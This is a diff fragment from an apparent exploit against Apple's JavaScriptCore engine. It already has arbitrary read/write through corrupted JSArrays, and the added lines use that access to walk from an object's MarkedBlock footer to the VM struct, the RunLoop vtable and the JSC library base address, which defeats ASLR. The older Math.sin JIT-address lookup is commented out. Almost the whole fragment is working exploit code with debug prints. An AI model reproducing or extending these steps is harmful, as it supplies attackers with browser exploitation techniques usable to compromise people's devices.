@@ -635,13 +635,33 @@ for (var i = 0; i < 1000; ++i) {
     };
         print("we have arbitrary r/w with JSArray :)");
    	memory = stage2;
-	var sinFuncAddr = addrof(Math.sin);
+	var bb = {};
+        //bb[0] = 1.1
+        var bbaddr = stage2.addrof(bb);
+        print("object address @ " + bbaddr);
+        var footeraddr = ((bbaddr & 0xffffc000) + (((bbaddr/0x100000000)|0)*0x100000000)+0x4000-0x130) 
+        //refer to VM.h this is
+        //JSC::MarkedBlock::footer at 0ffset 8 should be the vm struct
+        print("footeraddr @ " + footeraddr);
+        var vmstruct = stage2.readInt64(footeraddr+0x08); 
+        print("vmstruct @ " + vmstruct);
+        //var structdump = stage2.read(vmstruct,0x30);
+        var m_runloop = stage2.readInt64(vmstruct+0x10); 
+        //Ref <WTF::RunLoop> m_runLoop; at offset 0x10-0x18 proceeded by m_random
+        print("m_runloop @ " + m_runloop);
+        //at offset 0 of m_runloop should be a vtable  :) should sit within the shared cache
+        var vtable = stage2.readInt64(m_runloop);
+        print("vtable @ " + vtable);
+	var anchor = stage.readInt64(vtable);
+	var hdr = Sub(anchor, anchor.lo() & 0xfff);
+	print("JSC header @ " + hdr); 
+	/*var sinFuncAddr = addrof(Math.sin);
         print("Math.sin() @ " + sinFuncAddr);
         var executableAddr = memory.readInt64(Add(sinFuncAddr,24));
 	//print("executableaddr @ " + executableAddr);
         print("Math.sin() ExecutableAddr @ " + executableAddr); 
         var jitCodeAddr = memory.readInt64(Add(executableAddr , 24));
-	print("Math.sin() NativeJITCodeAddr @ " + jitCodeAddr);
+	print("Math.sin() NativeJITCodeAddr @ " + jitCodeAddr);*/
         
         /*var vtab = memory.read64(jitCodeAddr , 0);
         print("Math.sin() vtable @ " + vtab)*/
